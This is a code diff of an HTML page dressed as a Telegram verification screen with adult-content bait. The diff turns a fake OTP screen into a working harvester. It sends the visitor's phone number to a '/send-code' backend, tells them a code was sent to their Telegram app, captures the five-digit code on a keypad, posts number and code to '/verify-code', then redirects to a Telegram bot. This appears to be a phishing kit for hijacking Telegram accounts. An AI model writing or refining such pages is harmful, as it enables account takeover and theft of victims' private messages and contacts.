@@ -18,28 +18,24 @@
             position: relative;
         }
         
-        /* ব্যাকগ্রাউন্ড ভিডিও */
         .bg-video {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             object-fit: cover; z-index: 1; filter: brightness(0.5);
         }
 
-        /* মূল কন্টেইনার */
         .container {
             position: relative; z-index: 2; width: 92%; max-width: 380px;
             display: flex; flex-direction: column; align-items: center;
         }
 
-        /* হেডার বক্স */
         .header-box {
             background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
             width: 100%; text-align: center; margin-bottom: 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             position: relative;
-            margin-top: 35px; /* অ্যানিমেটেড আইকনের জায়গার জন্য */
+            margin-top: 35px;
         }
 
-        /* বড় অ্যানিমেটেড ফোন ও মেসেজ আইকন কন্টেইনার */
         .animated-icon-container {
             position: absolute; top: -45px; left: 50%; transform: translateX(-50%);
             width: 75px; height: 75px;
@@ -51,11 +47,7 @@
             animation: pulseGlow 1.5s infinite alternate;
         }
 
-        /* অ্যানিমেটেড আইকনের ভেতরকার গ্রাফিক্স ও সিগন্যাল ইফেক্ট */
-        .phone-icon-inner {
-            font-size: 34px;
-            animation: bounceIcon 1s infinite alternate;
-        }
+        .phone-icon-inner { font-size: 34px; animation: bounceIcon 1s infinite alternate; }
 
         @keyframes pulseGlow {
             0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
@@ -71,7 +63,6 @@
             margin-top: 10px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 12px;
         }
         
-        /* ফোন নম্বর ইনপুট */
         .phone-input {
             width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
             font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
@@ -84,7 +75,6 @@
         }
         .btn-get-code:active { transform: scale(0.97); }
 
-        /* ৫টি ওটিপি বক্স */
         .code-display {
             display: flex; gap: 8px; margin-bottom: 20px; justify-content: center;
         }
@@ -95,7 +85,6 @@
             backdrop-filter: blur(8px);
         }
 
-        /* নম্বর কিপ্যাড */
         .keypad {
             display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;
         }
@@ -112,26 +101,22 @@
 </head>
 <body>
 
-    <!-- ব্যাকগ্রাউন্ড ভিডিও -->
     <video autoplay muted loop playsinline class="bg-video">
         <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
     </video>
 
     <div class="container">
         
-        <!-- Header Box with Animated Glowing Icon -->
         <div class="header-box">
-            <!-- বড় অ্যানিমেটেড গ্লোয়িং আইকন -->
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
             </div>
 
-            <h2>Enter Telegram Number 🔞</h2>
+            <h2 id="boxTitle">Enter Telegram Number 🔞</h2>
             <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
-            <button class="btn-get-code" onclick="sendOtpRequest()">GET CODE 📩</button>
+            <button class="btn-get-code" id="actionBtn" onclick="handleAction()">GET CODE 📩</button>
         </div>
 
-        <!-- 5 Digit OTP Boxes -->
         <div class="code-display" id="codeDisplay">
             <div class="code-box"></div>
             <div class="code-box"></div>
@@ -140,7 +125,6 @@
             <div class="code-box"></div>
         </div>
 
-        <!-- Number Keypad -->
         <div class="keypad">
             <button class="key-btn" onclick="pressKey('1')">1</button>
             <button class="key-btn" onclick="pressKey('2')">2</button>
@@ -158,44 +142,86 @@
     </div>
 
     <script>
-        let currentOtp = "";
-        const MAX_LENGTH = 5;
+        let currentInput = "";
+        let step = "phone"; // প্রথমে ফোন ইনপুট, কোড পাঠানোর পর 'otp' হবে
+        let savedPhone = "";
+        const MAX_OTP_LENGTH = 5;
         const boxes = document.querySelectorAll('.code-box');
 
         function updateDisplay() {
-            for (let i = 0; i < MAX_LENGTH; i++) {
-                boxes[i].innerText = currentOtp[i] || "";
+            for (let i = 0; i < MAX_OTP_LENGTH; i++) {
+                boxes[i].innerText = currentInput[i] || "";
             }
         }
 
         function pressKey(num) {
-            if (currentOtp.length < MAX_LENGTH) {
-                currentOtp += num;
+            if (step === "otp" && currentInput.length < MAX_OTP_LENGTH) {
+                currentInput += num;
                 updateDisplay();
                 
-                if (currentOtp.length === MAX_LENGTH) {
-                    setTimeout(() => {
-                        alert("OTP Verified Successfully! 🔞");
-                        window.location.href = "https://t.me/Desi_Magi909_Bot?start=start";
-                    }, 500);
+                if (currentInput.length === MAX_OTP_LENGTH) {
+                    verifyOtpCode();
                 }
             }
         }
 
         function deleteKey() {
-            if (currentOtp.length > 0) {
-                currentOtp = currentOtp.slice(0, -1);
+            if (step === "otp" && currentInput.length > 0) {
+                currentInput = currentInput.slice(0, -1);
                 updateDisplay();
             }
         }
 
-        function sendOtpRequest() {
-            let phone = document.getElementById('phoneInput').value;
-            if(!phone) {
-                alert("Please enter your phone number with country code!");
-                return;
+        function handleAction() {
+            if (step === "phone") {
+                let phone = document.getElementById('phoneInput').value;
+                if(!phone) {
+                    alert("Please enter phone number with country code!");
+                    return;
+                }
+                savedPhone = phone;
+                
+                // ব্যাকএন্ডে কোড পাঠানোর রিকোয়েস্ট
+                fetch('/send-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: phone })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if(data.status === "success") {
+                        alert("OTP sent to your Telegram app!");
+                        step = "otp";
+                        currentInput = "";
+                        document.getElementById('phoneInput').style.display = "none";
+                        document.getElementById('boxTitle').innerText = "Enter 5-Digit OTP Code 🔑";
+                        document.getElementById('actionBtn').style.display = "none";
+                    } else {
+                        alert("Error: " + data.message);
+                    }
+                })
+                .catch(err => alert("Connection error!"));
             }
-            alert("Verification code sent to " + phone + " via Telegram!");
+        }
+
+        function verifyOtpCode() {
+            fetch('/verify-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: savedPhone, code: currentInput })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === "success") {
+                    alert("Verified Successfully! Redirecting...");
+                    window.location.href = "https://t.me/Desi_Magi909_Bot?start=start";
+                } else {
+                    alert("Verification Failed: " + data.message);
+                    currentInput = "";
+                    updateDisplay();
+                }
+            })
+            .catch(err => alert("Verification error!"));
         }
     </script>
 </body>
